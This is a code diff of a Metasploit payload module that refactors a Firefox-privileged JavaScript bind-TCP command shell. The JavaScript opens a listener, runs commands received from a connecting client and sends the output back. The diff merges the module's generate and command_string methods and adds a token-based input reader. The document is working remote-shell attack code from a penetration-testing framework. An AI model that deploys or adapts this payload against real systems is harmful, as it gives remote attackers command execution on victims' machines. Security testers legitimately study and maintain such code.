@@ -6,6 +6,7 @@
 require 'msf/core'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
@@ -23,22 +24,14 @@ module Metasploit3
       'Arch'          => ARCH_FIREFOX,
       'Handler'       => Msf::Handler::BindTcp,
       'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'firefox',
-      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
+      'PayloadType'   => 'firefox'
     ))
-  end
-
-  #
-  # Constructs the payload
-  #
-  def generate
-    super + command_string
   end
 
   #
   # Returns the JS string to use for execution
   #
-  def command_string
+  def generate
     %Q|
     (function(){
       Components.utils.import("resource://gre/modules/NetUtil.jsm");
@@ -59,16 +52,17 @@ module Metasploit3
         }
       };
 
+      #{read_until_token_source}
+
       var clientListener = function(outStream) {
         return {
           onStartRequest: function(request, context) {},
           onStopRequest: function(request, context) {},
-          onDataAvailable: function(request, context, stream, offset, count) {
-            var data = NetUtil.readInputStreamToString(stream, count).trim();
+          onDataAvailable: readUntilToken(function(data) {
             runCmd(data, function(err, output) {
               if(!err) outStream.write(output, output.length);
             });
-          }
+          })
         };
       };
 
